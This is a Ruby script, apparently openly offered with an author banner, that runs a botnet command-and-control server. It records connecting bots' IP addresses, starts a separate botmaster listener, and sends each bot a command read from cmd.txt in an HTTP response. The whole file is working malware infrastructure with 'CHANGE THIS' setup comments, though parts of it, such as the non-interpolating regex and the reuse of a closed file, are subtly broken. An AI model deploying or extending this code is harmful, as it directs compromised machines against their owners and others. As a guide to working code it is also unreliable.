#!/usr/bin/env ruby


require 'socket'

begin
  port = 6666  # CHANGE THIS
  masterport = 45678
  puts "
  _______ _______ ______ _______
  |     __|       |   __ \\   _   |
  |__     |   -   |      <       |
  |_______|_______|___|__|___|___|

  Made with <3 by AM-77

  To stop the server, type \`pkill ruby'\n\n"
  puts "[!] Starting bot listener on port #{port}"
  server = TCPServer.new("0.0.0.0", port)  # Change this to the port you have the client connecting to

  # Always override previous file
  cmdf = File.new("cmd.txt", 'w')
  cmdf.puts("NONE")
  cmdf.close
  puts "[!] Starting botmaster listener on port #{masterport}..."
  system("ruby botmaster.rb #{masterport} &")  # CHANGE THIS

  bot_file = File.new("bots.txt", 'a+')

  loop do
    Thread.start(server.accept) do |socket|

      if File.readlines("bots.txt").grep(/socket.peeraddr[3]/).any?
        puts "[*] Conn from prev addr"
        next
      end
      puts "[*] New connection from #{socket.peeraddr[3]}"
      bot_file.write("#{socket.peeraddr[3]}\n")
      bot_file.close

      request = socket.gets
      STDERR.puts request


      cmd_file_read = File.new("cmd.txt", 'r')

      response = cmd_file_read.read

      res =  "HTTP/1.1 200 OK\r\n"
      res += "Content-Type: text/plain\r\n"
      res += "Content-Length: #{response.bytesize}\r\n"
      res += "Connection: close\r\n"
      res += "\r\n"
      res += response

      socket.print res

      # Close connections
      cmd_file_read.close
      socket.close

  end end
rescue Interrupt
  puts "Caught interrupt, closing all ruby instances"
  system('pkill ruby')
end
